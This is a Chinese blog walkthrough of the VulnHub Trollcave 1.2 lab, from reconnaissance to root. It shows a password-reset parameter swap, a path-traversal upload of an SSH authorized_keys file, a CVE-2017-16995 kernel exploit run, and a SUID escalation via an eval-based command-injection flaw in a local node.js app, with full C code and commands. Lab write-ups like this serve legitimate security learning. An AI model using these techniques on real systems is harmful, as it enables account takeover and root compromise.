---
title: trollcave-v1-2
date: 2023-10-19 18:10:06
tags:
---
# trollcave-v1-2

靶机地址[Trollcave: 1.2 ~ VulnHub](https://www.vulnhub.com/entry/trollcave-12,230/)

目标为 root用户的**flag.txt**

## 靶机配置

靶机网卡配置参考我之前的[Os-hackNos-1_witwitwiter的博客-CSDN博客](https://blog.csdn.net/witwitwiter/article/details/119889384?spm=1001.2014.3001.5501)

## 渗透测试

使用nmap进行端口扫描

```
└─# nmap -sV 192.168.5.136                                                        
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-30 09:22 CST
Nmap scan report for 192.168.5.136 (192.168.5.136)
Host is up (0.00029s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
MAC Address: 00:0C:29:92:E4:A8 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.08 seconds

```

发现80端口

然后接着使用```drisearch```进行目录扫描

```
└─# dirsearch -u "http://192.168.5.136/"

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10877

Output File: /root/.dirsearch/reports/192.168.5.136/_21-09-02_21-14-34.txt

Error Log: /root/.dirsearch/logs/errors-21-09-02_21-14-34.log

Target: http://192.168.5.136/

[21:14:34] Starting: 
[21:14:38] 200 -    2KB - /404                                                                                                                     
[21:14:38] 200 -    2KB - /404.html            
[21:14:38] 200 -    1KB - /500                 
[21:14:42] 302 -   92B  - /admin  ->  http://192.168.5.136/login                                                 
[21:14:42] 302 -   92B  - /admin.aspx  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.jsp  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.conf  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.cgi  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.php  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.js  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.asp  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.cfm  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.dll  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.dat  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.html  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.htm  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.exe  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.ex  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.do  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.old  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.epc  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.mdb  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.passwd  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.py  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.php3  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.pl  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.mvc  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.woa  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.rb  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin/  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.shtml  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin/?/login  ->  http://192.168.5.136/login
[21:14:42] 302 -   92B  - /admin.srf  ->  http://192.168.5.136/login
[21:14:49] 302 -   92B  - /comments  ->  http://192.168.5.136/login                                                           
[21:14:51] 200 -    0B  - /favicon.ico                                                        
[21:14:55] 200 -    2KB - /login.jsp                                                                                             
[21:14:55] 200 -    2KB - /login.php
[21:14:55] 200 -    2KB - /login.aspx
[21:14:55] 200 -    2KB - /login
[21:14:55] 200 -    2KB - /login.asp
[21:14:55] 200 -    2KB - /login.html
[21:14:55] 200 -    2KB - /login.cgi
[21:14:55] 200 -    2KB - /login.pl
[21:14:55] 200 -  707B  - /login.js
[21:14:55] 500 -   48B  - /login.json
[21:14:55] 200 -    2KB - /login.py
[21:14:55] 200 -    2KB - /login.rb
[21:14:55] 200 -    2KB - /login.htm               
[21:14:55] 200 -    2KB - /login.shtml              
[21:14:55] 200 -    2KB - /login.srf                        
[21:14:55] 200 -    2KB - /login.wdm%20              
[21:14:55] 200 -    2KB - /login/                     
[21:14:59] 302 -   87B  - /register.html  ->  http://192.168.5.136/                                        
[21:14:59] 302 -   87B  - /register.jsp  ->  http://192.168.5.136/
[21:14:59] 302 -   87B  - /register  ->  http://192.168.5.136/
[21:14:59] 302 -   87B  - /register.js  ->  http://192.168.5.136/                                           
[21:14:59] 302 -   87B  - /register.aspx  ->  http://192.168.5.136/
[21:14:59] 302 -   87B  - /register.php  ->  http://192.168.5.136/
[21:14:59] 302 -   92B  - /reports  ->  http://192.168.5.136/login         
[21:14:59] 200 -  202B  - /robots.txt                             
[21:15:02] 302 -   92B  - /users.js  ->  http://192.168.5.136/login                                                           
[21:15:03] 302 -   92B  - /users.csv  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.html  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.aspx  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.php  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.ini  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.jsp  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.mdb  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.json  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.db  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.sqlite  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.sql  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.pwd  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.log  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.xls  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users/  ->  http://192.168.5.136/login
[21:15:03] 302 -   92B  - /users.txt  ->  http://192.168.5.136/login
                                                                                                            
Task Completed
```

可以看到有php环境和jsp环境，那么尝试访问login

![image-20230628231357999](image-20230628231357999.png)

一个登陆界面，旁边发现了最新的用户，以及在线用户，点击用户可以发现URL中最后多了一个数字，点击几次后，发现最新的用户是17，那么可以遍历1~17，得到所有用户的信息

![image-20230628231421655](image-20230628231421655.png)

```
King:Superadmin
dave:Admin
dragon:Admin
coderguy:Admin
cooldude89:Moderator
Sir:Moderator
Q:Moderator
teflon:Moderator
TheDankMan:Regular member
artemus:Regular member
MrPotatoHead:Regular member
Ian:Regular member
kev:Member
notanother:Member
anybodyhome:Member
onlyme:Member
xer:Member
```

可以到有一个Superadmin用户。

查询各种资料得到```https://github.com/rails/rails```

安装的时候会创建用户 rails，网站里还有一个重置密码的功能```http://192.168.5.136/password_resets/new```

直接选择重置king用户会报错，选择重置xer用户会得到如下链接```http://192.168.5.136/password_resets/edit.bdmbrG8YFz37cb8GU-2fgA?name=xer```

我们访问这个链接即可重置xer的密码

![image-20230628231500201](image-20230628231500201.png)

但我们尝试将```http://192.168.5.136/password_resets/edit.bdmbrG8YFz37cb8GU-2fgA?name=xer```改为```http://192.168.5.136/password_resets/edit.bdmbrG8YFz37cb8GU-2fgA?name=King```尝试利用逻辑错误重置king用户的密码

发现可以直接重置

进入之后，在file manager上传文件时，发现不能上传，在admin panel中发现可以开启上传

![image-20230628231519398](image-20230628231519398.png)

用哥斯拉生成jsp木马，上传至服务器，访问后发现没有解析

![image-20230628231533945](image-20230628231533945.png)



那么尝试上传ssh秘钥

首先生成ssh秘钥

```
ssh-keygen -f rails
mv rails.pub authorized_keys
```

将他上传到```/home/rails/.ssh/```

上传时要利用```../../../../../```跳转到根目录,故上传路径为```../../../../../../../home/rails/.ssh/authorized_keys```

然后进行ssh登录

```
mv rails id_rsa-rails chmod 600 id_rsa-rails
ssh -i id_rsa-rails rails@192.168.5.136
```

获取权限后查看系统信息

```
$ uname -a
Linux trollcave 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
$ cat /etc/lsb-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"

```

#### CVE-2017-16995提权

搜索到exphttps://www.exploit-db.com/exploits/45010

```
gcc cve.c -o cve
```

上传至服务器后

```
$ chmod 777 cve
$ ./cve
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88002b580900
[*] Leaking sock struct from ffff880028f0e000
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff88002f01b900
[*] UID from cred structure: 1001, matches the current: 1001
[*] hammering cred structure at ffff88002f01b900
[*] credentials patched, launching shell...
# id
uid=0(root) gid=0(root) groups=0(root),1001(rails)
# cat /root/flag.txt
et tu, dragon?

c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5

```





#### 利用suid提权

首先切换为bash，然后使用```netstat -natpl```查看端口

```
rails@trollcave:~$ netstat -natpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:3000            0.0.0.0:*               LISTEN      1065/ruby2.3    
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      -               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:55716         127.0.0.1:80            ESTABLISHED 1450/ruby       
tcp        0      0 127.0.0.1:55714         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 127.0.0.1:55744         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 127.0.0.1:55728         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 127.0.0.1:3000          127.0.0.1:55960         TIME_WAIT   -               
tcp        0      0 127.0.0.1:55720         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 127.0.0.1:3000          127.0.0.1:55950         TIME_WAIT   -               
tcp        0      0 127.0.0.1:55724         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 192.168.5.136:60830     91.189.91.38:80         ESTABLISHED -               
tcp        0      0 127.0.0.1:55958         127.0.0.1:3000          TIME_WAIT   -               
tcp        0      0 127.0.0.1:3000          127.0.0.1:55946         TIME_WAIT   -               
tcp        0      0 127.0.0.1:55962         127.0.0.1:3000          TIME_WAIT   -               
tcp        0      0 192.168.5.136:22        192.168.5.129:45382     ESTABLISHED -               
tcp        0      0 127.0.0.1:55968         127.0.0.1:3000          TIME_WAIT   -               
tcp        0      0 127.0.0.1:55954         127.0.0.1:3000          TIME_WAIT   -               
tcp        0      0 127.0.0.1:55682         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 192.168.5.136:58824     91.189.91.38:80         CLOSE_WAIT  -               
tcp        0      0 127.0.0.1:3000          127.0.0.1:55974         TIME_WAIT   -               
tcp        0      0 127.0.0.1:55738         127.0.0.1:80            TIME_WAIT   -               
tcp        0      0 127.0.0.1:80            127.0.0.1:55716         ESTABLISHED -               
tcp        0      0 127.0.0.1:55964         127.0.0.1:3000          TIME_WAIT   -               
tcp        0      0 127.0.0.1:55970         127.0.0.1:3000          TIME_WAIT   -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 ::1:5432                :::*                    LISTEN      -               
tcp6       0      0 ::1:50978               ::1:5432                ESTABLISHED 1065/ruby2.3    
tcp6       0      0 ::1:51680               ::1:5432                ESTABLISHED 1065/ruby2.3    
tcp6       0      0 ::1:5432                ::1:51680               ESTABLISHED -               
tcp6       0      0 ::1:51666               ::1:5432                ESTABLISHED 1065/ruby2.3    
tcp6       0      0 ::1:51678               ::1:5432                ESTABLISHED 1065/ruby2.3    
tcp6       0      0 ::1:51682               ::1:5432                ESTABLISHED 1065/ruby2.3    
tcp6       0      0 ::1:5432                ::1:51682               ESTABLISHED -               
tcp6       0      0 ::1:5432                ::1:51666               ESTABLISHED -               
tcp6       0      0 ::1:5432                ::1:51678               ESTABLISHED -               
tcp6       0      0 ::1:5432                ::1:50978               ESTABLISHED - 
```



使用```Shift + ~ +C```切换到ssh，然后使用```-L 8888:LOCALHOST:8888```将8888端口转发至本地

![image-20230628231554695](image-20230628231554695.png)

使用``` find / -name calc -print 2>&1| grep -v "Permission denied"```查找calc

```
rails@trollcave:~$ find / -name calc -print 2>&1| grep -v "Permission denied"
/usr/src/linux-headers-4.4.0-116-generic/include/config/can/calc
/usr/src/linux-headers-4.4.0-97-generic/include/config/can/calc
/home/king/calc

```

查看calc，发现里面有个calc.js，其中的内容为

```
rails@trollcave:~$ cat /home/king/calc/calc.js 
var http = require("http");
var url = require("url");
var sys = require('sys');
var exec = require('child_process').exec;//此处有命令执行漏洞

// Start server
function start(route)
{
        function onRequest(request, response)
        {
                var theurl = url.parse(request.url);
                var pathname = theurl.pathname;
                var query = theurl.query; 
                console.log("Request for " + pathname + query + " received.");
                route(pathname, request, query, response);
        }

http.createServer(onRequest).listen(8888, '127.0.0.1');
console.log("Server started");
}

// Route request
function route(pathname, request, query, response)
{
        console.log("About to route request for " + pathname);
        switch (pathname)
        {
                // security risk
                /*case "/ping":
                        pingit(pathname, request, query, response);
                        break;  */

                case "/":
                        home(pathname, request, query, response);
                        break;

                case "/calc":
                        calc(pathname, request, query, response);
                        break;

                default:
                        console.log("404");
                        display_404(pathname, request, response);
                        break;
        }
}

function home(pathname, request, query, response)
{
        response.end("<h1>The King's Calculator</h1>" +
                        "<p>Enter your calculation below:</p>" +
                        "<form action='/calc' method='get'>" +
                                "<input type='text' name='sum' value='1+1'>" +
                                "<input type='submit' value='Calculate!'>" +
                        "</form>" +
                        "<hr style='margin-top:50%'>" +
                        "<small><i>Powered by node.js</i></small>"
                        );
}

function calc(pathname, request, query, response)
{
        sum = query.split('=')[1];
        console.log(sum)
        response.writeHead(200, {"Content-Type": "text/plain"});

        response.end(eval(sum).toString());//此处执行了eval
}

function ping(pathname, request, query, response)
{
        ip = query.split('=')[1];
        console.log(ip)
        response.writeHead(200, {"Content-Type": "text/plain"});

        exec("ping -c4 " + ip, function(err, stdout, stderr) {
                response.end(stdout);
        });
}

function display_404(pathname, request, response)
{
        response.write("<h1>404 Not Found</h1>");
        response.end("I don't have that page, sorry!");
}

// Start the server and route the requests
start(route);
rails@trollcave:~$ 

```

经过审计得到var exec = require('child_process').exec;//此处有命令执行漏洞

![image-20230628231621733](image-20230628231621733.png)

```
rails@trollcave:/tmp$ ls -al
total 56
drwxrwxrwt  9 root  root   4096 Sep  2 17:46 .
drwxr-xr-x 23 root  root   4096 Sep  2  2021 ..
drwxrwxrwt  2 root  root   4096 Sep  2  2021 .font-unix
drwxrwxrwt  2 root  root   4096 Sep  2  2021 .ICE-unix
-rw-r--r--  1 king  king      0 Sep  2 17:46 passwd
-rw-------  1 rails rails 16664 Sep  2 15:40 RackMultipart20210902-1065-1d715xb
drwx------  3 root  root   4096 Sep  2  2021 systemd-private-3102f8c2d65243ab854375d95f3f6255-systemd-timesyncd.service-yaMXNV
drwxrwxrwt  2 root  root   4096 Sep  2  2021 .Test-unix
drwx------  2 root  root   4096 Sep  2  2021 vmware-root
drwxrwxrwt  2 root  root   4096 Sep  2  2021 .X11-unix
drwxrwxrwt  2 root  root   4096 Sep  2  2021 .XIM-unix
rails@trollcave:/tmp$ cat passwd
rails@trollcave:/tmp$ 

```

发现是king用户创建的，但是里面没有内容

在/tmp目录下

创建一个1.sh,内容为

```
#!/bin/sh
touch /tmp/123.txt
```



chmod 755 1.sh

测试是否能够运行

![image-20230628231643157](image-20230628231643157.png)

```
rails@trollcave:/tmp$ ls
123.txt  1.sh  pass  passwd  RackMultipart20210902-1065-1d715xb  systemd-private-3102f8c2d65243ab854375d95f3f6255-systemd-timesyncd.service-yaMXNV  vmware-root

```

成功运行了touch命令

那么可以通过suid进行提权

查看King的uid和gid

```
rails@trollcave:/tmp$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
postgres:x:111:116:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
king:x:1000:1000:King,,,:/home/king:/bin/bash
rails:x:1001:1001::/home/rails:
dragon:x:1002:1002:,,,:/home/dragon:/bin/bash
dave:x:1003:1003:,,,:/home/dave:/bin/bash
coderguy:x:1004:1004:,,,:/home/coderguy:/bin/bash

```

King的uid是1000	gid是1000



```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc,char *argv[])
{
setreuid(1000,1000);
execve("/bin/bash",NULL,NULL);
}

```

gcc king.c -o king

然后将king上传至靶机/tmp

在1.sh中写入

```
#!/bin/sh
cp /tmp/king /home/king/exp
chmod 4755 /home/king/exp
```



使用burp运行1.sh

![image-20230628231705251](image-20230628231705251.png)

```
rails@trollcave:/tmp$ ls /home/king/
calc  exp
```

使用exp提权,成功提权到King

```
rails@trollcave:/home/king$ ./exp
king@trollcave:/home/king$ 
```

查询sudo权限,发现不需要密码

```
king@trollcave:/home/king$ sudo -l
Matching Defaults entries for king on trollcave:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User king may run the following commands on trollcave:
    (ALL) NOPASSWD: ALL

```

那么直接提权到root，获取flag

```
king@trollcave:/home/king$ sudo su -
root@trollcave:~# cat /root/flag.txt 
et tu, dragon?

c0db34ce8adaa7c07d064cc1697e3d7cb8aec9d5a0c4809d5a0c4809b6be23044d15379c5

```

## 注意事项

cve-2017-16995在虚拟机安装有故障的时候会提权失败。suid提权是需要对应权限的用户的命令。chmod 4755与chmod 755 的区别在于开头多了一位，这个4表示其他用户执行文件时，具有与所有者相当的权限。

